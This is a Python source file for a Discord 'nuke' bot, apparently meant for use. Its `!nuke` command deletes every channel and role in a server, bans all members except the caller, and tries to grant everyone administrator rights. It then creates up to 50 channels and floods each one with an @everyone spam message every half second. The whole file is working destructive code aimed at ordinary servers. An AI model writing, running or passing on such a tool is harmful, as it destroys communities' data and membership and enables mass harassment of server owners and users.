import discord
from discord.ext import commands
import random
from colorama import Fore, Style, init
import asyncio

# Initialize colorama for Windows support
init(autoreset=True)

TOKEN = "DISCORD_TOKEN"
SPAM_CHANNEL_NAMES = ["nuked-by-ke", "get-wrecked"]
SPAM_MESSAGE = "@everyone THIS SERVER HAS BEEN NUKED"

# Intents are required in discord.py 2.0+
intents = discord.Intents.all()
client = commands.Bot(command_prefix="!", intents=intents)

@client.event
async def on_ready():
    print(Fore.CYAN + f"Logged in as {client.user.name}")
    print(Fore.YELLOW + "Support Server: https://discord.gg/break")
    await client.change_presence(activity=discord.Game(name="Managing Servers"))

@client.command()
@commands.is_owner()
async def stop(ctx):
    print(Fore.GREEN + f"{client.user.name} is logging out...")
    await client.close()

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    # Give everyone Admin (Attempt)
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=discord.Permissions.all())
        print(Fore.MAGENTA + "Granted everyone admin permissions.")
    except Exception as e:
        print(Fore.RED + f"Could not grant admin: {e}")

    # Delete all Channels
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"Deleted channel: {channel.name}")
        except:
            print(Fore.RED + f"Failed to delete channel: {channel.name}")

    # Ban all Members (Except yourself)
    for member in guild.members:
        if member != ctx.author and member != client.user:
            try:
                await member.ban(reason="Nuke")
                print(Fore.MAGENTA + f"Banned: {member.name}")
            except:
                print(Fore.RED + f"Could not ban: {member.name}")

    # Delete all Roles
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.MAGENTA + f"Deleted role: {role.name}")
        except:
            pass

    # Create Spam Channels
    amount = 50 
    for i in range(amount):
        try:
            new_channel = await guild.create_text_channel(random.choice(SPAM_CHANNEL_NAMES))
            print(Fore.GREEN + f"Created channel {i+1}")
        except:
            break

    print(Fore.GREEN + f"Nuke operation completed on {guild.name}")

@client.event
async def on_guild_channel_create(channel):
    # This will spam messages whenever a new channel is created
    try:
        while True:
            await channel.send(SPAM_MESSAGE)
            await asyncio.sleep(0.5) # Prevent instant rate-limiting
    except:
        pass

client.run(TOKEN)
